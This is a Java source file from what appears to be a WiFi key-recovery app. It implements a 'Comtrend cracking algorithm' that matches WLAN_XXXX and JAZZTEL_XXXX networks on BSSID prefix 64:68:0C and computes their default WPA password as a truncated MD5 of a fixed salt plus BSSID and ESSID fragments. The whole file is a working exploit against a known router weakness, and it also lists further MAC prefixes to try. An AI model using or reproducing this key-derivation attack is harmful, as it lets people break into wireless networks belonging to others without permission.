package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Comtrend cracking algorithm.
 * Exploits a security fail in the following router models:
 * COMTREND CT-5365
 * COMTREND AR5381U
 * This routers use an WPA encryption.
 * The corresponding mac addresses are:
 * 64:68:0C:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 * 
 * Unsuported/to be checked mac addresses:
 * 00:1A:2B:XX:XX:XX (266 keys...)
 * 00:1D:20:XX:XX:XX (I think it is supported...)
 * 00:1B:20:XX:XX:XX (I think it is supported...)
 * 00:23:F8:XX:XX:XX (See wpamagickey / I think it is supported...)
 * 00:1F:A4:XX:XX:XX (I thikn it is supported...)
 * 38:72:C0:XX:XX:XX
 * F4:3E:61:XX:XX:XX
 * 30:39:F2:XX:XX:XX
 * 00:19:15:XX:XX:XX (TECOM / Telephone numbers? Search...)
 * Information at:
 * Google search: andreagonzalez2k
 * Google search: wpamagickey
 * http://foro.seguridadwireless.net/aplicaciones-y-diccionarios-linux/wpamagickey-claves-por-defecto-wlan_xxxx-jazztel_xxxx-routers-comtrend-35300/
 */
public class ComtrendAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public ComtrendAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	@Override
	protected void setPatterns() {

		// ESSID: WLAN_XXXX
		// BSSID: 64:68:0C:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(64:68:0C:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 64:68:0C:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(64:68:0C:[0-9A-Fa-f:]{8})");
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		bssid_data = bssid_data.replace(":", "").toUpperCase();
		essid_data = essid_data.toUpperCase();
   		return MD5Hash("bcgbghgg"+bssid_data.substring(0,8)+essid_data.substring(essid_data.length()-4,essid_data.length())+bssid_data);
	}

	private static String MD5Hash(String input) {
		try {
			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes()))).toString(16);
			while (hashtext.length() < 20)
				hashtext = "0" + hashtext;
			return hashtext.substring(0, 20);
		}
		catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
	}

	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return mCapabilities.equals(WirelessEncryption.WPA);
	}

}
